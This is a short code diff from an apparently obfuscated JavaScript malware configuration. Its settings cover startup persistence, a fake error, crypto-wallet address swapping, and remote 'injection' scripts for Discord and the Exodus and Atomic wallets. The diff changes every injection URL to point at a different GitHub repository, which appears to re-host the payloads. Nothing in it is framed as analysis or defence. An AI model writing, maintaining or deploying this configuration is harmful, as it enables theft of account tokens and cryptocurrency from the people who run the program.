@@ -35,11 +35,11 @@ let _0x2d4cbb = {
   DoINeedTo_Startup: 'yes',
   DoINeedTo_FakeError: 'no',
   DiscordInjectionURL:
-    'https://raw.githubusercontent.com/FalseKSCH/Cat-MyInject/main/index.js',
+    'https://raw.githubusercontent.com/fuzzlesfixer/Assets/main/cat-inject/index.js',
   ExodusInjectionURL:
-    'https://raw.githubusercontent.com/FalseKSCH/Exodus-Injection/main/index.js',
+    'https://raw.githubusercontent.com/fuzzlesfixer/Assets/main/exodus-inject/index.js',
   AtomicInjectionURL:
-    'https://raw.githubusercontent.com/FalseKSCH/Atomic-Injection/main/vendors.c1828ed4edca9a5f556f.js',
+    'https://raw.githubusercontent.com/fuzzlesfixer/Assets/main/atomic-inject/vendors.c1828ed4edca9a5f556f.js',
   DoINeedTo_SwapWallet: {
     active: 'no',
     ltc_address: '',
